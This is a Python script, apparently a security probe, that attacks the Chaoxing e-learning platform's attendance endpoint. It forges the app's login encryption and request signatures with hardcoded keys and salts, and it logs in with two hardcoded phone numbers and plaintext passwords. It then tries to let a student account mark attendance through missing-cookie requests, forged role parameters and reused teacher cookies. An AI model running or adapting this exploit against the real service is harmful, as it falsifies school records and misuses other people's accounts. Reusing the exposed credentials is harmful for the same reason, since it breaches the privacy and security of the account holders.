import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def get_web_ua():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:600]})
    vuln = "成功" in detail or "success" in evidence.lower()[:100]
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:150]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞深入测试 - updateSignStatus绕过")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n[2] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")

    test_aid = active_ids[0]["id"] if active_ids else "5000163767353"

    print("\n" + "=" * 80)
    print("[3] updateSignStatus 无Cookie/部分Cookie测试")
    print("=" * 80)

    s_nocookie = requests.Session()
    s_nocookie.verify = False
    s_nocookie.headers.update({"User-Agent": get_mobile_ua()})

    r = s_nocookie.post(f"{base}/pptSign/updateSignStatus",
                        data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                              "uid": puid_s, "studentId": puid_s, "status": "1"},
                        headers=ajax_hdr, timeout=20)
    rec("T3-01", f"无Cookie调用updateSignStatus: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    s_uid_only = requests.Session()
    s_uid_only.verify = False
    s_uid_only.headers.update({"User-Agent": get_mobile_ua()})
    s_uid_only.cookies.set("UID", puid_s, domain=".chaoxing.com", path="/")
    s_uid_only.cookies.set("_uid", puid_s, domain=".chaoxing.com", path="/")

    r = s_uid_only.post(f"{base}/pptSign/updateSignStatus",
                        data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                              "uid": puid_s, "studentId": puid_s, "status": "1"},
                        headers=ajax_hdr, timeout=20)
    rec("T3-02", f"仅UID Cookie调用updateSignStatus: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[4] updateSignStatus Web UA测试")
    print("=" * 80)

    s_web = requests.Session()
    s_web.verify = False
    s_web.headers.update({"User-Agent": get_web_ua()})
    for c in s_s.cookies:
        s_web.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = s_web.post(f"{base}/pptSign/updateSignStatus",
                   data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                         "uid": puid_s, "studentId": puid_s, "status": "1"},
                   headers={"Referer": "https://mobilelearn.chaoxing.com/",
                            "X-Requested-With": "XMLHttpRequest"}, timeout=20)
    rec("T4-01", f"Web UA+学生Cookie: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    for c in s_t.cookies:
        s_web.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = s_web.post(f"{base}/pptSign/updateSignStatus",
                   data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                         "uid": puid_t, "studentId": puid_s, "status": "1"},
                   headers={"Referer": "https://mobilelearn.chaoxing.com/",
                            "X-Requested-With": "XMLHttpRequest"}, timeout=20)
    rec("T4-02", f"Web UA+教师Cookie: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] 创建新的普通签到活动（进行中）")
    print("=" * 80)

    r = s_t.post(f"{base}/ppt/activeAPI/createActive",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                       "title": "安全测试签到-请忽略"},
                 headers={**ajax_hdr, "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    d = safe_json(r)
    print(f"  创建签到结果: {json.dumps(d, ensure_ascii=False)[:300]}")

    new_aid = None
    if isinstance(d, dict) and d.get("result"):
        new_aid = str(d.get("result", ""))
        if new_aid and new_aid != "0" and len(new_aid) > 5:
            print(f"  新签到活动ID: {new_aid}")
        else:
            new_aid = None
            print(f"  创建失败，result={new_aid}")

    if not new_aid:
        r = s_t.post(f"{base}/ppt/activeAPI/createActive",
                     data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                           "title": "安全测试", "ifTiJiao": "1"},
                     headers={**ajax_hdr, "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
        d = safe_json(r)
        print(f"  重试创建: {json.dumps(d, ensure_ascii=False)[:300]}")
        if isinstance(d, dict) and d.get("result"):
            new_aid = str(d.get("result", ""))
            if new_aid and new_aid != "0" and len(new_aid) > 5:
                print(f"  新签到活动ID: {new_aid}")
            else:
                new_aid = None

    if not new_aid:
        print("  无法创建新签到活动，使用现有活动测试")
        new_aid = test_aid

    print("\n" + "=" * 80)
    print(f"[6] 使用活动ID={new_aid}测试updateSignStatus")
    print("=" * 80)

    print("\n--- 教师账号测试 ---")
    r = s_t.post(f"{base}/pptSign/updateSignStatus",
                 data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_t, "studentId": puid_s, "status": "1"},
                 headers=ajax_hdr, timeout=20)
    rec("T6-01", f"教师 updateSignStatus(新活动): {r.text[:100]}", r.text[:300])

    print("\n--- 学生账号测试 ---")
    r = s_s.post(f"{base}/pptSign/updateSignStatus",
                 data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s, "studentId": puid_s, "status": "1"},
                 headers=ajax_hdr, timeout=20)
    rec("T6-02", f"学生 updateSignStatus(新活动): {r.text[:100]}", r.text[:300])

    print("\n--- 学生使用教师Cookie测试 ---")
    s_hybrid = requests.Session()
    s_hybrid.verify = False
    s_hybrid.headers.update(s_s.headers)
    for c in s_t.cookies:
        s_hybrid.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = s_hybrid.post(f"{base}/pptSign/updateSignStatus",
                      data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                            "uid": puid_t, "studentId": puid_s, "status": "1"},
                      headers=ajax_hdr, timeout=20)
    rec("T6-03", f"教师Cookie+学生UA(新活动): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[7] updateSignStatus 不同status值测试")
    print("=" * 80)

    for status_val in ["0", "1", "2", "3", "4", "5", "6", "7"]:
        r = s_t.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_t, "studentId": puid_s, "status": status_val},
                     headers=ajax_hdr, timeout=20)
        rec(f"T7-{status_val}", f"教师 updateSignStatus(status={status_val}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[8] updateSignStatus 不同参数名组合测试")
    print("=" * 80)

    param_names = [
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "stuId": puid_s, "status": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "userId": puid_s, "status": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentUid": puid_s, "status": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "signStatus": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "signResultType": "1"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1", "operateSource": "2"},
        {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1", "sourceType": "1"},
        {"activeId": new_aid, "clazzId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1"},
    ]

    for i, params in enumerate(param_names):
        r = s_t.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        key_diff = [f"{k}={v}" for k, v in params.items() if k not in ("activeId", "classId", "courseId", "uid")]
        rec(f"T8-{i:02d}", f"教师 ({', '.join(key_diff)}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] 学生越权 - 所有绕过方法汇总")
    print("=" * 80)

    bypass_methods = [
        (s_s, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生-基本参数"),
        (s_s, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1"},
         "学生+uid=教师puid"),
        (s_s, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1", "role": "1"},
         "学生+role=1"),
        (s_s, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1", "roletype": "1"},
         "学生+roletype=1"),
    ]

    s_sso = requests.Session()
    s_sso.verify = False
    s_sso.headers.update(s_s.headers)
    for c in s_s.cookies:
        s_sso.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    s_sso.cookies.set("sso_role", "1", domain=".chaoxing.com", path="/")
    bypass_methods.append(
        (s_sso, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生+sso_role=1"))

    s_hybrid2 = requests.Session()
    s_hybrid2.verify = False
    s_hybrid2.headers.update(s_s.headers)
    for c in s_t.cookies:
        s_hybrid2.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    bypass_methods.append(
        (s_hybrid2, {"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t, "studentId": puid_s, "status": "1"},
         "教师Cookie+学生UA"))

    for i, (session, params, desc) in enumerate(bypass_methods):
        r = session.post(f"{base}/pptSign/updateSignStatus", data=params, headers=ajax_hdr, timeout=20)
        rec(f"T9-{i:02d}", f"{desc}: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[10] 结束新创建的签到活动")
    print("=" * 80)

    if new_aid and new_aid != test_aid:
        r = s_t.post(f"{base}/ppt/activeAPI/endSign",
                     data={"activeId": new_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                     headers=ajax_hdr, timeout=20)
        print(f"  结束签到: {r.text[:100]}")

    print("\n" + "=" * 80)
    print("[11] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deep_sign_bypass_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success_count = sum(1 for r in results if "成功" in r.get("detail", "") or "修改成功" in r.get("evidence", ""))
    fail_count = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    perm_count = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  修改成功: {success_count}, 修改失败: {fail_count}, 无权限: {perm_count}")

if __name__ == "__main__":
    run()
